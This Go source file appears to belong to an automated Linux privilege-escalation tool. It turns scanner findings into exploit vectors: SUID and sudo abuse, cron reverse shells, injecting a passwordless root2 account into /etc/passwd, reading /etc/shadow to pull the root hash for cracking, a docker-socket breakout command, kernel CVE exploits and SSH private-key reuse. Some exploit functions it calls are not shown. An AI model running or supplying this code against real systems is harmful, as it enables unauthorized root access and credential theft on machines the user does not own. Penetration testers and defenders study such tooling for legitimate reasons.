package main

import (
	"os"
	"path/filepath"
	"strings"
)

// ================================================================
// FASE 2 — Enumeration: scanner findings → exploit vectors
// ================================================================

func enumerateAll(p *AutoPrivilege) {
	for _, f := range p.Findings {
		if !f.Exploitable {
			continue
		}
		switch f.Source {
		case "SUID":
			enumerateSUID(p, f)
		case "SUDO":
			enumerateSUDO(p, f)
		case "CRON":
			enumerateCRON(p, f)
		case "FILE":
			if f.Target == "/etc/passwd" {
				enumeratePasswd(p)
			}
			if f.Target == "/etc/shadow" {
				enumerateShadow(p)
			}
		case "DOCKER":
			enumerateDocker(p)
		case "CAPS":
		case "NFS":
			enumerateNFS(p, f)
		case "KERNEL":
			enumerateKernelCVE(p, f)
		case "CRED":
			enumerateCredential(p, f)
		case "PATH":
		case "SERVICE":
		default:
		}
	}
}

func enumerateVector(p *AutoPrivilege, name string) {
	// Filter findings for specific vector
	for _, f := range p.Findings {
		if !f.Exploitable {
			continue
		}
		switch name {
		case "suid":
			if f.Source == "SUID" {
				enumerateSUID(p, f)
			}
		case "sudo":
			if f.Source == "SUDO" {
				enumerateSUDO(p, f)
			}
		case "cron":
			if f.Source == "CRON" {
				enumerateCRON(p, f)
			}
		case "passwd":
			if f.Source == "FILE" && f.Target == "/etc/passwd" {
				enumeratePasswd(p)
			}
		case "docker":
			if f.Source == "DOCKER" {
				enumerateDocker(p)
			}
		}
	}
}

func addVector(p *AutoPrivilege, name, category, target, command string, risk RiskLevel, fn func() *ExploitResult, meta map[string]string) {
	v := Vector{
		Name:     name,
		Category: category,
		Target:   target,
		Command:  command,
		Risk:     risk,
		Exploit:  fn,
		Meta:     meta,
	}
	p.Vectors = append(p.Vectors, v)
}

// --- SUID enumeration ---
func enumerateSUID(p *AutoPrivilege, f Finding) {
	bin := extractBinName(f.Target)
	cmd, ok := getCommand(bin)
	if !ok {
		return
	}

	risk := RiskLow
	if isSuidShellBin(bin) {
		risk = RiskHigh
	}

	addVector(p, "SUID "+bin, "suid", f.Target, cmd, risk,
		func() *ExploitResult {
			return exploitSUID(f.Target, cmd)
		},
		map[string]string{"bin": bin, "path": f.Target})
}

// --- SUDO enumeration ---
func enumerateSUDO(p *AutoPrivilege, f Finding) {
	if f.Target == "ALL" {
		addVector(p, "sudo ALL", "sudo", "sudo -i", "sudo -i", RiskHigh,
			func() *ExploitResult {
				return exploitSudoALL()
			}, nil)
		return
	}

	bin := extractBinName(f.Target)
	cmd, ok := getCommand(bin)
	if !ok {
		return
	}

	risk := RiskMedium
	if strings.Contains(f.Description, "NOPASSWD") {
		risk = RiskHigh
	}

	sudoCmd := "sudo " + f.Target
	addVector(p, "sudo "+bin, "sudo", f.Target, sudoCmd, risk,
		func() *ExploitResult {
			return exploitSudo(f.Target, cmd)
		},
		map[string]string{"bin": bin, "path": f.Target})
}

// --- Cron enumeration ---
func enumerateCRON(p *AutoPrivilege, f Finding) {
	addVector(p, "cron "+f.Target, "cron", f.Target,
		"echo reverse shell → "+f.Target, RiskHigh,
		func() *ExploitResult {
			return exploitCron(f.Target)
		},
		map[string]string{"path": f.Target})
}

// --- Passwd enumeration ---
func enumeratePasswd(p *AutoPrivilege) {
	addVector(p, "passwd injection", "passwd", "/etc/passwd",
		"root2::0:0:::", RiskHigh,
		func() *ExploitResult {
			return exploitPasswd()
		}, nil)
}

func enumerateShadow(p *AutoPrivilege) {
	addVector(p, "shadow readable", "shadow", "/etc/shadow",
		"Read /etc/shadow → manually crack hash", RiskHigh,
		func() *ExploitResult {
			data, err := os.ReadFile("/etc/shadow")
			if err != nil {
				return &ExploitResult{Vector: "shadow", Error: err.Error()}
			}
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "root:") {
					parts := strings.Split(line, ":")
					if len(parts) > 1 && parts[1] != "" && parts[1] != "*" && parts[1] != "!" {
						return &ExploitResult{
							Vector:  "shadow",
							Success: true,
							Output:  "Root hash found: " + parts[1] + " — crack with: john /etc/shadow",
							IsRoot:  false,
						}
					}
				}
			}
			return &ExploitResult{Vector: "shadow", Error: "no root hash found"}
		}, nil)
}

// --- Docker enumeration ---
func enumerateDocker(p *AutoPrivilege) {
	addVector(p, "docker breakout", "docker", "/var/run/docker.sock",
		"docker run -v /:/mnt alpine chroot /mnt sh", RiskHigh,
		func() *ExploitResult {
			return exploitDocker()
		}, nil)
}

// --- NFS enumeration ---
func enumerateNFS(p *AutoPrivilege, f Finding) {
	// todo
}

// --- Kernel CVE enumeration ---
func enumerateKernelCVE(p *AutoPrivilege, f Finding) {
	addVector(p, f.Target, "kernel", f.Target,
		"Download exploit from exploit-db or compile separately", f.Risk,
		func() *ExploitResult {
			return exploitKernelCVE(f.Target, f.Description)
		},
		map[string]string{"cve": f.Target, "desc": f.Description})
}

// --- Credential enumeration ---
func enumerateCredential(p *AutoPrivilege, f Finding) {
	if strings.Contains(f.Target, "_rsa") || strings.Contains(f.Target, "_ed25519") ||
		strings.Contains(f.Target, "_ecdsa") || strings.Contains(f.Target, "_dsa") {
		addVector(p, "ssh-key "+f.Target, "cred", f.Target,
			"ssh -i "+f.Target+" user@target", RiskHigh,
			func() *ExploitResult {
				return &ExploitResult{Vector: "ssh-key", Success: true, Output: "Use: ssh -i " + f.Target + " user@target"}
			},
			map[string]string{"type": "ssh-private-key", "path": f.Target})
	}
}

// Helper
func extractBinName(path string) string {
	return filepath.Base(path)
}
